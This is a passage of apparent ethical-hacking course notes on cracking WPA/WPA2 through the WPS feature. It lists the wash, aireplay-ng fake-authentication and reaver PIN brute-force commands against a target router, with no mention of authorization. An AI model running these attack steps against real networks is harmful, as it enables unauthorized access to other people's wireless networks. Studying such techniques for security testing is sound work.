# Section 06 - Network Hacking - Gaining Access (WEP/WPA/WPA2 Cracking)

## WPA/WPA2 Cracking - Exploiting WPS Feature

Your wireless adapter must be in `Monitor` mode.

Display all the routers that have WPS enabled with:
```bash
wash --interface $IFACE
```

- `Lck` tells whether WPS is locked or not, usually after a number of failed attempts.
- `dBm` is the signal strength.

The only way the attack might fail is if PBC (Push Button Connection) is enabled, meaning the WPS button needs to be pressed for the router to accept PINs.

Type the association command in one terminal (but do not execute it yet):
```bash
aireplay-ng --fakeauth=30 -a <MAC_ADDRESS_OF_TARGET_NETWORK> -h <MAC_ADDRESS_OF_ADAPTER> $IFACE
```

`30` is the delay associated with the **Fake Authentication** attack, meaning "associate with the network every 30 seconds".

Launch the attack in another terminal with:
```bash
reaver --bssid=<BSSID> --channel=<Ch> --interface=$IFACE -vvv --no-associate
```

- `BSSID` and `Ch` are taken from the `wash` command.
- `-vvv` is useful to troubleshoot failures.
- `--no-associate` tells Reaver not to associate with the target network because we are already doing that manually with `aireplay-ng`. Reaver can associate automatically for you but it tends to fail much more often than `aireplay-ng`.

Only then can you execute the `aireplay-ng` command to associate with the access point.

As a result, Reaver will try to brut-force the PIN. If successful, Reaver is able to discover and display the WPA key.
